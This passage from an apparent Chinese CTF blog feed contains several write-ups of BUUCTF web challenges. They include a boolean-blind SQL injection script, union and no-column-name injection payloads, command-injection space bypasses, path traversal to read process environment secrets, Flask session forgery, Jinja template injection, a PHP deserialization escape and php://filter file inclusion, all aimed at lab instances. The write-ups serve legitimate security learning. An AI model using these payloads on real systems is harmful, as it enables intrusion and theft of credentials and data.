<span class="token comment">// 1</span><span class="token delimiter important">?></span></span>     </code></pre></code></pre><p>字符串<code>&#39;1e11&#39;</code>—-1<br>数字<code>1e10</code>——&gt;1410065408<br>利用这个绕过<br><code>num=2019e11</code><br>第二个：<br>MD5：<code>$a==md5($a)</code>———&gt;<code>0e215962017</code><br>第三个：<br>命令执行<br>ls<br><code>404.html fAke_f1agggg.php fl4g.php fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag img.jpg index.php robots.txt </code><br>空格被过，用<code>$IFS$9</code>绕过,php环境下<code>%09</code>也可绕过空格<br>cat变成ca\t可绕过，也可直接tac        </p><h2 id="解"><a href="#解" class="headerlink" title="解"></a>解</h2><p>payload：<code>?num=2019e11&amp;md5=0e215962017&amp;get_flag=ca\t%09fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag</code>        </p><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><p><code>$IFS</code>也可以绕过空格，但是<code>ls$IFS/</code>能执行，而<code>tac$IFSflag</code>却不能执行成功，为什么呢？        </p><p><code>$&#123;IFS&#125;,$IFS,$IFS$9的区别</code><br>单纯的<code>cat$IFS2</code>,bash解释器会把整个<code>IFS2</code>当做变量名，所以导致输不出来结果，然而如果加一个<code>&#123;&#125;</code>就固定了变量名，同理在后面加个<code>$</code>可以起到截断的作用，但是为什么要用<code>$9</code>呢，因为<code>$9</code>只是当前系统shell进程的第九个参数的持有者，它始终为空字符串。      </p><p>对于 <code>&gt;,+</code> 等 符号的过滤 , <code>$PS2</code>变量为<code>&gt;</code>,<code>$PS4</code>变量则为<code>+</code>            </p><p><a href="https://www.freebuf.com/articles/web/137923.html">MORE</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUU每日一题</title>
    <link href="/2021/03/09/BUU048/"/>
    <url>/2021/03/09/BUU048/</url>
    
    <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>[BJDCTF 2nd]简单注入<br><img src="https://ftp.bmp.ovh/imgs/2021/03/44e4763d0293348f.png">       </p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>又过滤了好多<br><code>&#39;、&quot;、select、-、=、like、and</code><br>看WP说有提示—-&gt;<code>robots.txt</code><br>一般遇到看不懂的题我才会试一下常见的目录，没想到…….<br><img src="https://ftp.bmp.ovh/imgs/2021/03/9c3fc6bade9ff396.png"><br>这和hgame那道一样<br><code>\</code>转义         </p><h2 id="解"><a href="#解" class="headerlink" title="解"></a>解</h2><pre><code>```pythonimport requestsimport timeimport datetimeurl=&quot;http://3e7c563a-f050-412d-a249-054ffcd8ecff.node3.buuoj.cn/index.php&quot;flag=&quot;&quot;st=&quot;stronger&quot;for i in range(1,20):    s=30    l=127    mid=(s+l)&gt;&gt;1    while(l&gt;s):        time.sleep(0.1)        #payload=&quot;or if(ascii(substr(database(),&#123;&#125;,1))&gt;&#123;&#125;,1,0)#&quot;.format(i,mid)        #payload=&quot;or if(ascii(substr(username,&#123;&#125;,1))&gt;&#123;&#125;,1,0)#&quot;.format(i,mid)        payload=&quot;or if(ascii(substr(password,&#123;&#125;,1))&gt;&#123;&#125;,1,0)#&quot;.format(i,mid)        data=&#123;&quot;username&quot;:&quot;test\\&quot;,&quot;password&quot;:payload&#125;        #time1=datetime.datetime.now()        r=requests.post(url=url,data=data)        #time2=datetime.datetime.now()        #tem=(time2-time1).seconds        if st in r.text:            s=mid+1        else:            l=mid        mid=(s+l)&gt;&gt;1    if s==30 or l==127:        break    flag=flag+chr(mid)    print(flag)      ```          </code></pre><p>时间盲注也能跑出来，就是有点儿慢<br>or后面0或者1的回显不同<br>0——&gt;<code>You konw ,P3rh4ps needs a girl friend</code><br>1——&gt;<code>BJD needs to be stronger</code><br>—&gt;bool盲注</p><p>这题的报表直接对列来操作，因为在上面的SQL语句中有<code>FROM users</code>，而且=和like都被过了，只能这样了吧<br><img src="https://ftp.bmp.ovh/imgs/2021/03/17cfe81b59870b7a.png"></p>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUU每日一题</title>
    <link href="/2021/03/08/BUU047/"/>
    <url>/2021/03/08/BUU047/</url>
    
    <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>[SWPU2019]Web1     </p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>注册登录后<br><img src="https://ftp.bmp.ovh/imgs/2021/03/911adb6d6d040a6b.png"><br>考虑XSS<br>但试了试，感觉不行<br>看看WP<br>是填写广告名那里存在SQL注入<br>有过滤<br><code>#、or、--、information、空格....</code>双写也绕不过<br>报错信息<code>You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &#39;&#39;1&#39;&#39; limit 0,1&#39; at line 1</code><br>数据库—–&gt;MariaDB<br>注释被过，可以最后加个<code>&#39;</code>闭合下后面的<code>&#39;</code><br>空格被过用<code>/**/</code><br>order没法用，可以换成group<br><code>1&#39;/**/group/**/by/**/50,&#39;</code>二分法查看有多少个字段—-&gt;22个<br>MariaDB中的<code>mysql.innodb_table_stats</code>可以查到所有的表，类似于<code>information_schema.tables</code>吧<br>然后是      </p><p><code>无列名注入</code>         </p><p><img src="https://ftp.bmp.ovh/imgs/2021/03/06a0943a7b2b0112.png"><br>列名变成了1，2，3<br><img src="https://ftp.bmp.ovh/imgs/2021/03/c4be37e1bc11bae4.png"><br>用反引号查询特定的列<br>反引号也可以用as替换<br><img src="https://ftp.bmp.ovh/imgs/2021/03/67a55ac030f9ddd6.png"><br>括号里表的字段数也要fuzz一下<br><code>1&#39;/**/union/**/select/**/1,2,(select/**/1,2/**/union/**/select*from/**/users),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;2</code>————–&gt;报错<code>The used SELECT statements have a different number of columns</code></p><h2 id="解"><a href="#解" class="headerlink" title="解"></a>解</h2><p>查表payload：<code>1&#39;/**/union/**/select/**/1,(select/**/group_concat(table_name)/**/from/**/mysql.innodb_table_stats),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#39;</code><br>表：<code>FLAG_TABLE,news,users,gtid_slave_pos,ads,users</code><br>无列名查询：<code>1&#39;/**/union/**/select/**/1,2,(select/**/group_concat(d)/**/from(select/**/1,2,3/**/as/**/d/**/union/**/select*from/**/users)ad),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;2</code><br>得到flag       </p><p>这个无列名注入最后的括号前面需要有随便的字母<br>不知道为什么？？      </p><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><p><a href="https://www.cnblogs.com/wangtanzhi/p/12241499.html">MORE</a><br><a href="https://blog.redforce.io/sqli-extracting-data-without-knowing-columns-names/">[SQLi] Extracting data without knowing columns names</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Henuctf</title>
    <link href="/2021/03/07/henuctf/"/>
    <url>/2021/03/07/henuctf/</url>
    
    <content type="html"><![CDATA[<h2 id="Find"><a href="#Find" class="headerlink" title="Find"></a>Find</h2><pre><code>```php &lt;?phperror_reporting(0);include &#39;flag.php&#39;;highlight_file(__FILE__);if(!(is_file($_GET[&#39;name&#39;])===false))&#123;    echo $flag;    &#125;else&#123;    die(&quot;发生甚么事了？&quot;);    &#125;?&gt; 发生甚么事了？```    </code></pre><p><code>is_file</code> — 判断给定文件名是否为一个正常的文件<br>如果文件存在且为正常的文件则返回 TRUE，否则返回 FALSE。<br>上面有个<code>flag.php</code>,那直接<code>name=flag.php</code>即可      </p><p>但是，学长说这道题出错了，不应该<code>include &#39;flag.php&#39;;</code><br>预期的解是用数组绕过<code>is_file</code>函数<br><code>name[]=1</code>      </p><h2 id="shop"><a href="#shop" class="headerlink" title="shop"></a>shop</h2><p>hint：当前进程下的环境变量为<code>/proc/self/environ</code><br>知识点：flask session伪造<br>任意文件读取，<img src="https://ftp.bmp.ovh/imgs/2021/03/1934b3e1e8d9fb33.png"><br>读取hint中的文件，不过要先进行目录跳跃</p><p><code>download?image=/../../proc/self/environ</code><br>里面有<code>SECRET_KEY=SK7BM6DwM52ByfSmNJfP1QYe4MdXnMUW3ibrL8AtHOSTNAME</code>密钥<br>然后用<code>flask-session-cookie-manager</code><br><img src="https://ftp.bmp.ovh/imgs/2021/03/5f53b08a21a8d4fe.png"><br>提交即可<br><code>flask-session-cookie-manager</code>基本用法：<br>编码：  </p><pre><code>$ python&#123;2,3&#125; flask_session_cookie_manager&#123;2,3&#125;.py encode -s &#39;.&#123;y]tR&amp;sp&amp;77RdO~u3@XAh#TalD@Oh~yOF_51H(QV&#125;;K|ghT^d&#39; -t &#39;&#123;&quot;number&quot;:&quot;326410031505&quot;,&quot;username&quot;:&quot;admin&quot;&#125;&#39;eyJudW1iZXIiOnsiIGIiOiJNekkyTkRFd01ETXhOVEExIn0sInVzZXJuYW1lIjp7IiBiIjoiWVdSdGFXND0ifX0.DE2iRA.ig5KSlnmsDH4uhDpmsFRPupB5Vw       </code></pre><p>解码：<br>使用密钥：      </p><pre><code>$ python&#123;2,3&#125; flask_session_cookie_manager&#123;2,3&#125;.py decode -c &#39;eyJudW1iZXIiOnsiIGIiOiJNekkyTkRFd01ETXhOVEExIn0sInVzZXJuYW1lIjp7IiBiIjoiWVdSdGFXND0ifX0.DE2iRA.ig5KSlnmsDH4uhDpmsFRPupB5Vw&#39; -s &#39;.&#123;y]tR&amp;sp&amp;77RdO~u3@XAh#TalD@Oh~yOF_51H(QV&#125;;K|ghT^d&#39;&#123;u&#39;username&#39;: &#39;admin&#39;, u&#39;number&#39;: &#39;326410031505&#39;&#125;        </code></pre><p>没有密钥：       </p><pre><code>$ python&#123;2,3&#125; flask_session_cookie_manager&#123;2,3&#125;.py decode -c &#39;eyJudW1iZXIiOnsiIGIiOiJNekkyTkRFd01ETXhOVEExIn0sInVzZXJuYW1lIjp7IiBiIjoiWVdSdGFXND0ifX0.DE2iRA.ig5KSlnmsDH4uhDpmsFRPupB5Vw&#39;&#123;&quot;number&quot;:&#123;&quot; b&quot;:&quot;MzI2NDEwMDMxNTA1&quot;&#125;,&quot;username&quot;:&#123;&quot; b&quot;:&quot;YWRtaW4=&quot;&#125;&#125;          </code></pre><p><a href="https://github.com/noraj/flask-session-cookie-manager">MORE</a></p><h2 id="Mai"><a href="#Mai" class="headerlink" title="Mai"></a>Mai</h2><p><code>__toString</code>魔法函数的触发：         </p><ol><li>把对象当字符串输出       </li><li>把对象当作字符串比较也可触发<h2 id="love"><a href="#love" class="headerlink" title="love"></a>love</h2></li></ol><p>这道SQL注入，把ascii和substr禁了，然后就不知道该咋弄了，百度当时也没查到         </p><pre><code>ascii可以用ord替换        substr可以用mid,left应该也可以        </code></pre><p><a href="https://blog.csdn.net/qq_19272431/article/details/78564391">异或</a></p><pre><code>1 ^ 1 = 00 ^ 0 = 01 ^ 0 = 10 ^ 1 = 11^1^1=11^0^1=0</code></pre><p>太笨了太笨了</p>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUU每日打卡</title>
    <link href="/2021/03/06/BUU046/"/>
    <url>/2021/03/06/BUU046/</url>
    
    <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>[WesternCTF2018]shrine        </p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>源码：    </p><pre><code>```pythonimport flaskimport osapp = flask.Flask(__name__)app.config[&#39;FLAG&#39;] = os.environ.pop(&#39;FLAG&#39;)          ##flag在config里@app.route(&#39;/&#39;)def index():    return open(__file__).read()@app.route(&#39;/shrine/&#39;)def shrine(shrine):    def safe_jinja(s):        s = s.replace(&#39;(&#39;, &#39;&#39;).replace(&#39;)&#39;, &#39;&#39;)        blacklist = [&#39;config&#39;, &#39;self&#39;]        return &#39;&#39;.join([&#39;&#123;&#123;% set &#123;&#125;=None%&#125;&#125;&#39;.format(c) for c in blacklist]) + s    return flask.render_template_string(safe_jinja(shrine))if __name__ == &#39;__main__&#39;:    app.run(debug=True)     ```   </code></pre><p>两个路由，第二个存在SSTI<img src="https://ftp.bmp.ovh/imgs/2021/03/45aacf69b12a54b2.png"><br>flag在config里，但config和self被禁了<br>如果没被禁的话就可以直接<code>&#123;&#123;config&#125;&#125;</code>或者<code>&#123;&#123;self.dict&#125;&#125;</code><br>可以用<code>url_for</code>和<code>get_flashed_message</code>       </p><h2 id="解"><a href="#解" class="headerlink" title="解"></a>解</h2><p>payload1：<code>&#123;&#123;url_for.__globals__['current_app'].config&#125;&#125;</code>        </p><p><code>url_for</code>用于给指定的函数创建url，加上<code>__globals</code>可以访问所有的路由，然后读取当前APP的config<br>payload2：<code>&#123;&#123;get_flashed_messages.__globals__['current_app'].config&#125;&#125;</code><br><code>get_flashed_messages</code>返回之前在Flask中通过 flash() 传入的闪现信息列表。把字符串对象表示的消息加入到一个消息队列中，然后通过调用 <code>get_flashed_messages()</code> 方法取出,闪现信息只能取出一次，取出后闪现信息会被清空.        </p><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><p><a href="https://flask.palletsprojects.com/en/1.0.x/api/#flask.get_flashed_messages"><code>get_flashed_message</code></a><br><a href="https://flask.palletsprojects.com/en/1.0.x/api/?highlight=url_for#flask.url_for"><code>url_for</code></a></p>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUU每日打卡</title>
    <link href="/2021/03/05/BUU045/"/>
    <url>/2021/03/05/BUU045/</url>
    
    <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p><code>[安洵杯 2019]easy_serialize_php</code>        </p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>题目给出源码          </p><pre><code><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$function</span> <span class="token operator">=</span> @<span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'f'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$img</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>       <span class="token shell-comment comment">##过滤</span>    <span class="token variable">$filter_arr</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'php'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'flag'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'php5'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'php4'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'fl1g'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$filter</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'/'</span><span class="token punctuation">.</span><span class="token function">implode</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'|'</span><span class="token punctuation">,</span><span class="token variable">$filter_arr</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token single-quoted-string string">'/i'</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token variable">$filter</span><span class="token punctuation">,</span><span class="token single-quoted-string string">''</span><span class="token punctuation">,</span><span class="token variable">$img</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">unset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"user"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'guest'</span><span class="token punctuation">;</span>           <span class="token shell-comment comment">##session初始值</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'function'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$function</span><span class="token punctuation">;</span><span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$function</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token single-quoted-string string">'&lt;a href="index.php?f=highlight_file">source_code&lt;/a>'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'img_path'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'img'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'guest_img.png'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'img'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'img_path'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$serialize_info</span> <span class="token operator">=</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$function</span> <span class="token operator">==</span> <span class="token single-quoted-string string">'highlight_file'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'index.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$function</span> <span class="token operator">==</span> <span class="token single-quoted-string string">'phpinfo'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'phpinfo();'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//maybe you can find something in here!</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$function</span> <span class="token operator">==</span> <span class="token single-quoted-string string">'show_image'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$userinfo</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$serialize_info</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$userinfo</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'img'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>          </span></code></pre></code></pre><p>第一个点：<code>extract($_POST)</code><br>extract — 从数组中将变量导入到当前的符号表<br><img src="https://ftp.bmp.ovh/imgs/2021/03/881d9fbac954102b.png"><br>通过这个可以达到覆盖<code>$_SESSION</code>的目的<br>如：<br>在这句话的下面加上<code>var_dump($_SESSION);</code><br>原来的输出:<code>array(2) &#123; [&quot;user&quot;]=&gt; string(5) &quot;guest&quot; [&quot;function&quot;]=&gt; NULL &#125;</code><br>POST传入<code>_SESSION[flag]=123</code>后的输出是：<code>array(1) &#123; [&quot;flag&quot;]=&gt; string(3) &quot;123&quot; &#125;</code><br>第二个点：在<code>phpinfo</code>中找到文件<code>d0g3_f1ag.php</code><br>第三个点：<code>file_get_contents</code>以此读取文件，<code>$_SESSION[img]=d0g3_f1ag.php</code><br>第四个点：先序列化后过滤<br>之前做过一道<code>[0CTF 2016]piapiapia</code>是变长的<br>这道题是变短的过滤的字替换为空，但前面的数值代表的长度是不变的，会继续向后读<br>而且传入的SESSION是序列化后的数组，以<code>&#125;</code>结尾，后面的反序列化时会被舍弃，也就绕过了<code>$_SESSION[&#39;img&#39;] = base64_encode(&#39;guest_img.png&#39;);</code>        </p><h2 id="解"><a href="#解" class="headerlink" title="解"></a>解</h2><p>payload：<code>_SESSION[user]=flagflagflagflagflagflag&amp;_SESSION[function]=a&quot;;s:8:&quot;function&quot;;s:6:&quot;adminn&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;</code><br>这个payload进入后<code>$serialize_info</code>的输出是：<code>a:3:&#123;s:4:&quot;user&quot;;s:24:&quot;【&quot;;s:8:&quot;function&quot;;s:70:&quot;a】&quot;;s:8:&quot;function&quot;;s:6:&quot;adminn&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125;</code><br>【】是自己加的，这之间的是24个，被视为是user的值了<br><img src="https://ftp.bmp.ovh/imgs/2021/03/f64fe9e43e570e0c.png"><br>然后读取<code>/d0g3_fllllllag</code>即可      </p>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUU每日一题044</title>
    <link href="/2021/03/04/BUU044/"/>
    <url>/2021/03/04/BUU044/</url>
    
    <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>[BSidesCF 2020]Had a bad day<br><img src="https://ftp.bmp.ovh/imgs/2021/03/f5f5f1cac583c37f.png">   </p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>点击其中一个后会出来一张图片，而且URL变成<code>http://3c2d7f7c-2f24-42ca-84de-dfa013335bf4.node3.buuoj.cn/index.php?category=woofers</code><br>本来以为是SQL注入，加了个<code>&#39;</code><br>回显：<img src="https://ftp.bmp.ovh/imgs/2021/03/d6e58884d2fe94c0.png"><br>是文件包含<br><code>php://filter/read=convert.base64-encode/source=flag.php</code><br>回显：<code>Sorry, we currently only support woofers and meowers.</code><br>试一下<code>index</code><br>成功读出    </p><pre><code><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'category'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token function">strpos</span><span class="token punctuation">(</span> <span class="token variable">$file</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"woofers"</span> <span class="token punctuation">)</span> <span class="token operator">!==</span>  <span class="token boolean constant">false</span> <span class="token operator">||</span> <span class="token function">strpos</span><span class="token punctuation">(</span> <span class="token variable">$file</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"meowers"</span> <span class="token punctuation">)</span> <span class="token operator">!==</span>  <span class="token boolean constant">false</span> <span class="token operator">||</span> <span class="token function">strpos</span><span class="token punctuation">(</span> <span class="token variable">$file</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"index"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">include</span> <span class="token punctuation">(</span><span class="token variable">$file</span> <span class="token punctuation">.</span> <span class="token single-quoted-string string">'.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token double-quoted-string string">"Sorry, we currently only support woofers and meowers."</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span>  </code></pre></code></pre><p>然后没招了<br>看了WP<br><code>伪协议嵌套</code>       </p><h2 id="解"><a href="#解" class="headerlink" title="解"></a>解</h2><p>payload：<code>php://filter/read=convert.base64-encode/index/resource=flag</code></p>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUU每日一题043</title>
    <link href="/2021/03/03/BUU043/"/>
    <url>/2021/03/03/BUU043/</url>
    
    <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>[SUCTF 2019]Pythonginx<br><img src="https://ftp.bmp.ovh/imgs/2021/03/a959acc0f70a10c6.png">   </p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>题目给了源码：     </p><pre><code><pre class="language-python" data-language="python"><code class="language-python">        <span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/getUrl'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">getUrl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    url <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"url"</span><span class="token punctuation">)</span>    host <span class="token operator">=</span> parse<span class="token punctuation">.</span>urlparse<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span>hostname    <span class="token keyword">if</span> host <span class="token operator">==</span> <span class="token string">'suctf.cc'</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"我扌 your problem? 111"</span>    parts <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span>urlsplit<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">)</span>    host <span class="token operator">=</span> parts<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>    <span class="token keyword">if</span> host <span class="token operator">==</span> <span class="token string">'suctf.cc'</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"我扌 your problem? 222 "</span> <span class="token operator">+</span> host    newhost <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> h <span class="token keyword">in</span> host<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        newhost<span class="token punctuation">.</span>append<span class="token punctuation">(</span>h<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'idna'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    parts<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'.'</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>newhost<span class="token punctuation">)</span>    <span class="token comment">#去掉 url 中的空格</span>    finalUrl <span class="token operator">=</span> urlunsplit<span class="token punctuation">(</span>parts<span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    host <span class="token operator">=</span> parse<span class="token punctuation">.</span>urlparse<span class="token punctuation">(</span>finalUrl<span class="token punctuation">)</span><span class="token punctuation">.</span>hostname    <span class="token keyword">if</span> host <span class="token operator">==</span> <span class="token string">'suctf.cc'</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>finalUrl<span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"我扌 your problem? 333"</span>     </code></pre></code></pre><p>前两个if不能等于<code>suctf.cc</code>，第三个if读取文件—-&gt;<code>file</code>协议<br>第三个if要<code>host == &#39;suctf.cc&#39;</code><br>不过第三个前面还有个decode<br>所以对输入的加密即可      </p><p>偷大佬的脚本：       </p><pre><code><pre class="language-python" data-language="python"><code 